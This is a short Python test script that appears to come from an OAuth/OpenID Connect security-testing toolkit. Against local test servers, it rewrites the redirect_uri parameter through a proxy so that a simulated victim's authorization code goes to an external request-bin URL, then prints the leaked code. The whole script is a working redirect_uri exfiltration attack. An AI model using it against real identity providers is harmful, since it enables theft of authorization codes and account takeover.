import sys
import os

from osbtlib import BrowserSimulator, Osbtlib

# set endpoints
HONEST_RP_ENDPOINT = "http://localhost:3000"
HONEST_OP_ENDPOINT = "http://localhost:3001"
PROXY_SERVER_ENDPOINT = "http://localhost:8080"
PROXY_EXTENSION_ENDPOINT = "http://localhost:5555"

# set requestbin parameters
PIPEDREAM_URL = os.environ.get('PIPEDREAM_URL')
PIPEDREAM_TOKEN = os.environ.get('PIPEDREAM_TOKEN')
PIPEDREAM_SOURCE_ID = os.environ.get('PIPEDREAM_SOURCE_ID') 

# victim credentials
victim_username = 'guest'
victim_password = 'guest'

# create instance of osbtlib
osbt = Osbtlib(
    proxy_extension_url = PROXY_EXTENSION_ENDPOINT
)
bs = BrowserSimulator(f'{HONEST_RP_ENDPOINT}/login', PROXY_SERVER_ENDPOINT)

try:
    # modify query param (redirect_uri)
    attacker_server_url = PIPEDREAM_URL
    osbt.proxy.modify_query_param('redirect_uri', attacker_server_url, 'localhost:3001', '/consent')    

    # define browser operations
    sso_flow = f"""
page.locator('input[name="userId"]').fill('{victim_username}')
page.locator('input[name="password"]').fill('{victim_password}')
page.locator('input[type="submit"]').click()
page.locator('input[type="submit"][value="Yes"]').click()
    """
    # run browser operations
    bs.run(sso_flow)
    
    # get code from requestbin history
    history = osbt.requestbin.get_requestbin_history(PIPEDREAM_TOKEN, PIPEDREAM_SOURCE_ID)
    code = history['data'][0]['event']['query']['code']
    assert(code != None)
    if code != None:
        print('Authorization code leaked!!')
        print('code:', code)

except Exception as e:
    print('Error:', e)
    osbt.proxy.clean()